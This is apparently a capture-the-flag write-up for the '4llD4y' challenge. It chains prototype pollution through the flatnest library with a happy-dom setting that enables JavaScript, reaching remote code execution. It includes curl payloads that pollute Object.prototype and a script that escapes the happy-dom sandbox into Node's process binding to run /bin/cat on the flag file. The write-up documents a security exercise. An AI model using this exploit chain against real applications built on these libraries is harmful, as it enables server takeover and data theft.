# 4llD4y – Happy-DOM Prototype Pollution RCE

## Challenge Summary

The application exposes two endpoints:

- `POST /config` — accepts arbitrary user input and processes it with `flatnest`
- `POST /render` — renders attacker-supplied HTML using `happy-dom`

Improper handling of nested object keys in `/config` allows **server-side prototype pollution**.  
This can be chained with a **hidden Happy-DOM configuration gadget** to achieve **remote code execution**.

---

## Source Code (Relevant)

```js
import express from 'express';
import { Window } from 'happy-dom';
import { nest } from 'flatnest';

app.post('/config', (req, res) => {
  const incoming = typeof req.body === 'object' && req.body ? req.body : {};
  nest(incoming);
  return res.json({ message: 'configuration applied' });
});

app.post('/render', (req, res) => {
  const html = typeof req.body?.html === 'string' ? req.body.html : '';
  const window = new Window({ console });
  window.document.write(html);
  const output = window.document.documentElement.outerHTML;
  res.type('html').send(output);
});
```
## Vulnerability Analysis

### 1. Prototype Pollution Source

- `flatnest` recursively merges user-controlled input.
- No sanitization of `__proto__`, `constructor`, or prototype paths.
- Allows pollution of `Object.prototype`.
- The `/config` endpoint does not persist state, but **mutates global prototypes**, affecting future logic.

---

### 2. Hidden Happy-DOM Gadget

- `happy-dom` disables JavaScript execution by default.
- Internally, it checks:

```js
settings.enableJavaScriptEvaluation === true
```

- If this property is **inherited via the prototype chain**, JavaScript execution is enabled.
- The application never explicitly sets `settings`, so the value is resolved from `Object.prototype`.
- This makes `settings.enableJavaScriptEvaluation` a **prototype pollution gadget**.

---

## Exploitation Strategy

1. Use `/config` to pollute `Object.prototype`
2. Inject `settings.enableJavaScriptEvaluation = true`
3. Trigger HTML rendering via `/render`
4. Execute JavaScript inside Happy-DOM
5. Escape to Node.js and read the flag

---

## Exploit Walkthrough

### Step 1 — Prototype Pollution via `/config`

The `flatnest` library expands dotted keys into nested objects without filtering
prototype paths. The following payload pollutes `Object.prototype`:

```bash
curl -s http://challenges3.ctf.sd:33635/config \
  -H "Content-Type: application/json" \
  -d '{
    "polluter": "[Circular (_proto_)]",
    "polluter.settings": {},
    "polluter.settings.enableJavaScriptEvaluation": true
  }'
```

## Resultant 

```js
Object.prototype.settings.enableJavaScriptEvaluation === true
```
All newly created objects now inherit this property

### Step 2 — Trigger JavaScript Execution in Happy-DOM

When `/render` creates a new `Window`, Happy-DOM internally checks:

```js
if (settings.enableJavaScriptEvaluation) {
  // allow script execution
}
```
- Because settings is inherited via the prototype chain, JavaScript execution
becomes enabled without any direct configuration by the application.

### Step 3 — Escape Happy-DOM and Execute Commands

- With JavaScript execution enabled, we escape the Happy-DOM sandbox and access
the underlying Node.js runtime:

```js
curl -s http://challenges3.ctf.sd:33635/render \
  -H "Content-Type: application/json" \
  -d '{
    "html": "<script>
      const process = this.constructor.constructor(\"return process\")();
      const spawn = process.binding(\"spawn_sync\");
      const opts = {
        file: \"/bin/cat\",
        args: [\"cat\", \"/flag_409b00f155ca4c97.txt\"],
        envPairs: [],
        stdio: [
          { type: \"pipe\", readable: true, writable: false },
          { type: \"pipe\", readable: false, writable: true },
          { type: \"pipe\", readable: false, writable: true }
        ]
      };
      const result = spawn.spawn(opts);
      document.body.innerHTML =
        String.fromCharCode.apply(
          null,
          new Uint8Array(result.output[1])
        );
    </script>"
  }'
```

The flag contents are written directly into the HTML response returned by the
server.
